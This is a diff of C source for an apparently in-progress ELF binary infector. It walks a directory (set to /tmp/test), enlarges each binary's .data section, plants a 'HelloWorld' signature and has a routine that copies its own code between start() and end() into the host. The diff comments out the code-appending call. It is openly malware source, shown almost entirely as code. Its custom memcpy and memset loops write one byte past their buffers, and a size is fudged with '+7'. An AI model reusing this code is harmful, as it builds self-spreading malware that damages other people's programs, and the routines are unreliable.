@@ -1,4 +1,4 @@
-void  start() {}
+static void  start(void) {}
 #define _FCNTL_H
 #include <linux/stat.h>
 #include <stddef.h>
@@ -22,7 +22,7 @@ struct  linux_dirent {
   char            d_name[];
 };
 
-void  end(void);
+static void  end(void);
 int   entry_point(void);
 
 static int  write(int fd, const void *buf, size_t count) {
@@ -104,7 +104,7 @@ static int  getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int co
 }
 
 static void *memcpy(void *dest, const void *src, size_t n) {
-  while (n > 0) {
+  while (n != 0) {
     ((char *)dest)[n] = ((char *)src)[n];
     n -= 1;
   }
@@ -150,6 +150,15 @@ static int strcmp(const char *s1, const char *s2) {
   return (s1[i] - s2[i]);
 }
 
+static void *memset(void *s, int c, size_t n) {
+  while (n != 0) {
+    ((char *)s)[n] = c;
+    n -= 1;
+  }
+  ((char *)s)[0] = c;
+  return (s);
+}
+
 static void  *memmove(void *dest, const void *src, size_t n) {
   size_t  i;
 
@@ -158,11 +167,12 @@ static void  *memmove(void *dest, const void *src, size_t n) {
     memcpy(dest, src, n);
   else {
     i += n - 1;
-    while (n > 0) {
+    while (n != 0) {
       ((char *)dest)[i] = ((char *)src)[i];
       n -= 1;
       i -= 1;
     }
+    ((char *)dest)[0] = ((char *)src)[0];
   }
   return (dest);
 }
@@ -254,7 +264,7 @@ static void updateOffsets(Elf64_Ehdr *header, size_t offset, size_t toAdd) {
     }
 }
 
-Elf64_Shdr *getDataSectionHeader(Elf64_Ehdr *header) {
+static Elf64_Shdr *getDataSectionHeader(Elf64_Ehdr *header) {
   Elf64_Shdr  *pointer;
   Elf64_Shdr  *shstrHeader;
   char        dataName[] = ".data";
@@ -266,11 +276,10 @@ Elf64_Shdr *getDataSectionHeader(Elf64_Ehdr *header) {
   return (pointer);
 }
 
-char payload[] = "HelloWorld";
-
 static void  appendSignature(struct bfile file, size_t offset) {
   size_t  toAdd;
 
+char payload[] = "HelloWorld";
   toAdd = strlen(payload) + 1;
   memmove(((void *)file.header) + offset + toAdd, ((void *)file.header) + offset, file.size - offset);
   memcpy(((void *)file.header) + offset, payload, toAdd);
@@ -280,7 +289,8 @@ static int  appendShellcode(struct bfile *bin) {
   struct bfile  new;
   size_t  size;
 
-  size = end - start;
+  // TODO Replace 7 by size of last instructions
+  size = end - start + 7;
   new.size = bin->size + size;
   if ((new.header = mmap(NULL, new.size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
     return (-1);
@@ -320,6 +330,7 @@ static int  infectFile(struct bfile bin) {
   Elf64_Shdr  *data;
   Elf64_Off   offset;
 
+char payload[] = "HelloWorld";
   len = strlen(payload);
   data = getDataSectionHeader(bin.header);
   data->sh_size += len + 1;
@@ -327,8 +338,8 @@ static int  infectFile(struct bfile bin) {
   appendSignature(bin, offset + data->sh_size - (len + 1));
   bin.size += len + 1;
   updateOffsets(bin.header, offset + data->sh_size - len - 1, len + 1);
-  if (appendCode(&bin) == -1)
-    return (-1);
+  /* if (appendCode(&bin) == -1) */
+  /*   return (-1); */
   write(bin.fd, bin.header, bin.size);
   close(bin.fd);
   munmap(bin.header, bin.size);
@@ -354,8 +365,6 @@ static int  infectBins(const char *dirname) {
 
   if ((fd = open(dirname, O_RDONLY | O_DIRECTORY, 0)) < 0)
     return (-1);
-  char  hello[] = "HelloWorld\n";
-  write(1, hello, 11);
   // TODO Dirs with size > BUF_SIZE
   if ((nread = getdents(fd, (struct linux_dirent *)buf, BUF_SIZE)) < 0)
     return (-1);
@@ -376,15 +385,19 @@ static int  infectBins(const char *dirname) {
 }
 
 int   entry_point(void) {
-  size_t  i;
-  char    *infectDir[3] = {"/tmp/test", NULL};
+  /* size_t  i; */
+  // TODO Array of string
+  char    infectDir[] = "/tmp/test";
 
-  i = 0;
-  while (infectDir[i] != NULL) {
-    if (infectBins(infectDir[i]) == -1)
-      return (1);
-    i += 1;
-  }
+/*   i = 0; */
+  if (infectBins(infectDir) == -1)
+    return (1);
+  /* while (infectDir[i] != NULL) { */
+  /*   if (infectBins(infectDir[0]) == -1) */
+  /*     return (1); */
+  /*   i += 1; */
+  /* } */
   return (0);
 }
-void  end() {}
+
+static void    end(void) {}
